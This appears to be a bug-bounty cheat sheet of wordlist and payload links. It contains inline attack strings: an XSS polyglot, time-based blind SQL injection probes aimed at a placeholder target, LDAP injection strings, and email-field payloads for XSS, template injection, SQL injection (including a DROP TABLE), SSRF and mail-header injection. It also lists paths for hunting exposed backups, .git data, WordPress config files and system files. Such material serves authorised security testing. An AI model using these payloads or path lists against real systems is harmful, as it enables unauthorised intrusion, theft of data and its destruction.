# Wordlists & Payloads:

# **Wordlists & Payloads:**

<details>
<summary>XSS payloads :</summary>

<dl>
<dd>

1. https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt

2. `https://github.com/payloadbox/xss-payload-list`

3. https://github.com/terjanq/Tiny-XSS-Payloads

4. https://github.com/emadshanab/easyXssPayload

5. https://github.com/emadshanab/XSS

6. https://github.com/payloadbox/xss-payload-list

7. https://d3adend.org/xss/ghettoBypass

<details>
<summary>Polygot xss</summary>

<dl>
<dd>

https://twitter.com/lutfumertceylan/status/1284078795754999808

<details>
<summary>Payload</summary>

<dl>
<dd>

->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>SSTI</summary>

<dl>
<dd>

https://twitter.com/_bughunter/status/1522619419024887809?s=20&t=4mSFTJWFSu3UmsJm6Wxo8w

</dd>
</dl>

</details>

<details>
<summary>SQLi</summary>

<dl>
<dd>

https://github.com/twseptian/sql-injection-payload-list

<details>
<summary>Payloads raw</summary>

<dl>
<dd>

This is how to find SQL injection 100% of the time, if there is one:

```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'  <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
'+(select*from(select(sleep(10)))a)+'
(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
'XOR(if(now()=sysdate(),sleep(20),0))XOR’Z
'XOR(if(now()=sysdate(),sleep(3*2),0))XOR'Z/?akincibor=cachebuster
```

Use these patterns against e.g.:

- http://target.com/?q=HERE

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>LDAP injection Payloads</summary>

<dl>
<dd>

\*

*)(&**))%00  
)(cn=))\x00**()|%26'**()|&'**(|(mail=**))**(|(objectclass=**))**)(uid=**))(|(uid=* *admin* *admin**)((|userpassword=*)  
admin\*)((|userPassword=\*)  
x' or name()='username' or 'x'='y

</dd>
</dl>

</details>

<details>
<summary>https://github.com/emadshanab/payloads</summary>



</details>

<details>
<summary>https://github.com/Bo0oM/fuzz.txt</summary>



</details>

<details>
<summary>https://github.com/vinnyvinoth/wordlists-2</summary>



</details>

<details>
<summary>https://github.com/Proviesec/directory-payload-list</summary>



</details>

<details>
<summary>https://github.com/vinnyvinoth/Bug-Bounty-Wordlists</summary>



</details>

<details>
<summary>https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt</summary>



</details>

<details>
<summary>Email address payloads</summary>

<dl>
<dd>

XSS (Cross-Site Scripting):

```
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

Template injection:

```
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```

SQL injection:

```
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com

{“email”:”\”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1\”@a.com”}	Valid	Delay: 7,854 milis

{“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}	Valid	Delay: 8,696 milis

{“email”:”\”a’-IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”} No delay
```

SSRF (Server-Side Request Forgery):

```
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

Parameter pollution:

```
victim&email=attacker@example.com
```

(Email) header injection:

```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com

“payload”@domain.com
name@”payload”domain.com
name(payload)@domain.com
name@(payload)domain.com
name@domain.com(payload)


Double parameter (aka. HPP / HTTP parameter pollution):
email=victim@xyz.tld&email=hacker@xyz.tld

Carbon copy:
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld

Using separators:
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld

No domain:
email=victim

No TLD (Top Level Domain):
email=victim@xyz

JSON table:
{"email":["victim@xyz.tld","hacker@xyz.tld"]}
```

</dd>
</dl>

</details>

<details>
<summary>Resolvers</summary>

<dl>
<dd>

https://github.com/BonJarber/fresh-resolvers/blob/main/resolvers.txt

https://github.com/six2dez/resolvers_reconftw

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cujanovic/CRLF-Injection-Payloads</summary>



</details>

<details>
<summary>Http request headers</summary>

<dl>
<dd>

https://gist.githubusercontent.com/iustin24/92a5ba76ee436c85716f003dda8eecc6/raw/d759ed591ce85a1ae256b3936ae21f4951c19f33/headers.txt

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cujanovic/Markdown-XSS-Payloads</summary>



</details>

<details>
<summary>https://github.com/cujanovic/subdomain-bruteforce-list</summary>

<dl>
<dd>

https://gist.github.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cujanovic/Content-Bruteforcing-Wordlist</summary>



</details>

<details>
<summary>https://github.com/emadshanab/971-MB-content_discovery_wordlist</summary>



</details>

<details>
<summary>Fuzzing</summary>

<dl>
<dd>

<details>
<summary>Subdomain fuzz</summary>

<dl>
<dd>

https://github.com/internetwache/CT_subdomains

https://gist.github.com/cihanmehmet/5d7f6d6514b4c1c54c00ebf36d5f9e81

https://github.com/assetnote/commonspeak2

https://github.com/Droidzzzio/EnumerationList

https://github.com/tannaybagga/subdomains-wordlist

https://github.com/onvio/wordlists

https://github.com/rajesh6927/subdomain-bruteforce-wordlist

https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056

https://github.com/danTaler/WordLists

https://github.com/ZephrFish/Wordlists

</dd>
</dl>

</details>

https://github.com/fuzzdb-project/fuzzdb

https://github.com/google/fuzzing

https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt

https://github.com/fuzzdb-project/fuzzdb

https://github.com/ameenmaali/wordlistgen

https://github.com/the-xentropy/samlists

https://github.com/emadshanab/subs_all

<details>
<summary>Old databse dumps `files`</summary>

<dl>
<dd>

/back.sql  
/backup.sql  
/accounts.sql  
/backups.sql  
/clients.sql  
/customers.sql  
/data.sql  
/database.sql  
/database.sqlite  
/users.sql  
/db.sql  
/db.sqlite  
/db\_backup.sql  
/dbase.sql  
/dbdump.sql  
setup.sql  
sqldump.sql  
/dump.sql  
/mysql.sql  
/sql.sql  
/temp.sql

/.git  
/.git-rewrite  
/.git/HEAD  
/.git/config  
/.git/index  
/.git/logs/  
/.git\_release  
/.gitattributes  
/.gitconfig  
/.gitignore  
/.gitk  
/.gitkeep  
/.gitmodules  
/.gitreview  
/.svn  
/.svn/entries  
/.svnignore

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Admin pages</summary>

<dl>
<dd>

https://github.com/emadshanab/admin-login

</dd>
</dl>

</details>

<details>
<summary>Drupal Dirsearch</summary>

<dl>
<dd>

https://github.com/emadshanab/Drupal-Dir-Search

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cujanovic/dirsearch-wordlist</summary>



</details>

<details>
<summary>https://github.com/assetnote/commonspeak2-wordlists</summary>



</details>

<details>
<summary>https://github.com/assetnote/commonspeak2</summary>



</details>

<details>
<summary>https://github.com/Proviesec/directory-payload-list</summary>



</details>

<details>
<summary>https://github.com/six2dez/OneListForAll</summary>



</details>

<details>
<summary>Directory Bruteforce</summary>

<dl>
<dd>

<details>
<summary>https://github.com/emadshanab/Konan/tree/master/db</summary>



</details>

<details>
<summary>https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10</summary>



</details>

<details>
<summary>Extra</summary>

<dl>
<dd>

/$company.zip  
/$company.bak  
/$company.backup  
/$company.conf  
/$company.config

/.git/HEAD  
/.git/logs/HEAD  
/.import/  
/.bashrc  
/admin-cgi  
/admin-console  
/backup/  
/console/  
/console/login  
/h2console  
/cgi-bin/admin.cgi  
/jmx-console/  
/portal/  
/portal/login  
/syslog/  
/web-console

/wp-cron.php

/.git  
/.git-rewrite  
/.git/HEAD  
/.git/index  
/.git/logs  
/.gitattributes  
/.gitconfig  
/.gitkeep  
/.gitmodules  
/.gitreview  
/.svn/entries  
/.svnignore

/log/production.log  
/config/app\_env.yml  
/config/database.yml  
/config/secrets.yml

/var/log

/var/spool/crony

/etc/cron.\*

/etc/group

/etc/passed

/var/log/btmp

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Wordpress hidden endpoints</summary>

<dl>
<dd>

<details>
<summary>https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md</summary>



</details>

1. wp-includes [directory]

2. index.php

3. wp-login.php

4. wp-links-opml.php

5. wp-activate.php

6. wp-blog-header.php

7. wp-cron.php

8. wp-links.php

9. wp-mail.php

10. xmlrpc.php

11. wp-settings.php

12. wp-trackback.php

13. wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php

14. wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/import.php

15. wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/import.php

16. wp-config.php\_orig

17. wp-config.php

18. wp-config.php.bkp

19. wp-admin.php

20. wp-config.php

21. wp-content/uploads

22. Wp-load

23. wp-signup.php

24. Wp-json

25. wp-includes [directory]

26. index.php

27. wp-login.php

28. wp-links-opml.php

29. wp-activate.php

30. wp-blog-header.php

31. wp-cron.php

32. wp-links.php

33. wp-mail.php

34. xmlrpc.php

35. wp-settings.php

36. wp-trackback.php

37. wp-signup.php

38. /wp-config.php.bak

39. /wp-content/debug.log

</dd>
</dl>

</details>

<details>
<summary>Backup files wordlists</summary>

<dl>
<dd>

1. https://github.com/xajkep/wordlists/blob/master/discovery/backup_files_only.txt

2. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-DB-Backups.txt

3. https://github.com/aldo-moreno-leon/Wordlists-content-discovery

4. https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt

5. https://github.com/Karanxa/Bug-Bounty-Wordlists

</dd>
</dl>

</details>

<details>
<summary>Generate your own target based wordlist using gau</summary>

<dl>
<dd>

1. cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u > wordlist.txt

2. Another one :

cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt

3. Another one : cat ~/bugbountydata/\*/all-subdomains.txt | tr "." "\n" | sort -u

</dd>
</dl>

</details>

<details>
<summary>Combine wordlist and domain for subdomain resolving</summary>

<dl>
<dd>

https://twitter.com/0xhunster/status/1569284010429534208?s=20&t=PrKzzJkeYEbJcvF_LRjI7w

</dd>
</dl>

</details>

<details>
<summary>HTTP Headers list</summary>

<dl>
<dd>

https://gist.githubusercontent.com/iustin24/92a5ba76ee436c85716f003dda8eecc6/raw/d759ed591ce85a1ae256b3936ae21f4951c19f33/headers.txt

https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt

</dd>
</dl>

</details>

<details>
<summary>https://github.com/Co0nan/ParamsExtractor</summary>



</details>

---
